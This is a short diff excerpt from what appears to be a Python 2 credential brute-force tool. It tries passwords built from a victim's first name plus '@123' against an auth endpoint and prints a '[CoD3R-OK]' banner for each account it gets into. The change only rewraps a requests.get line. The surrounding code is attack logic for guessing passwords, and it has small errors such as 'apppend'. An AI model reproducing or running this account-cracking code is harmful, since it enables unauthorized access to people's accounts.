@@ -723,9 +723,8 @@ pass5, headers = header).text
                                                         cps.apppend(uid + pass11)
                                                     else:
 						        pass12 = name.lower().split(' ')[0] + '@123'
-                                                        data = requests.get
-
-('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers = header).text
+                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + 
+'&pass=' + pass12, headers = header).text
                                                         q = json.loads(data)
                                                         if 'loc' in q:
                                                             print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass12
